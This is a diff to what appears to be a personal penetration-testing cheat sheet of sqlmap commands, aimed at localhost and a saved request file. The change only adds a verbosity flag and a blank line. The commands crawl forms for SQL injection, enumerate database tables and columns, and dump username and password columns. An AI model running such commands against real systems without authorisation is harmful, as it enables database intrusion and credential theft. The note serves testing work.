@@ -27,6 +27,7 @@ Reference: [Usage · sqlmapproject/sqlmap Wiki · GitHub](https://github.com/sql
 $ sqlmap -u "http://localhost" --forms --batch --crawl=10 --level=5 --risk=3
 $ sqlmap -r myapps --proxy=http://127.0.0.1:8080 --random-agent --level=5 --risk=3
 
+
 ```
 
 ```bash
@@ -43,7 +44,7 @@ sqlmap -r myapps --random-agent --level=5 --risk=3 -D sample_db --tables
 sqlmap -r myapps --random-agent --level=5 --risk=3 -D sample_db -T sample_table --columns
 
 # enumeration(dump data from specific columns (username, password):
-sqlmap -r myapps --random-agent --risk=3 -D sample_db -T sample_table -C username, password --dump
+sqlmap -r myapps -v4 --random-agent --risk=3 -D sample_db -T sample_table -C username, password --dump
 ```
 
 ---
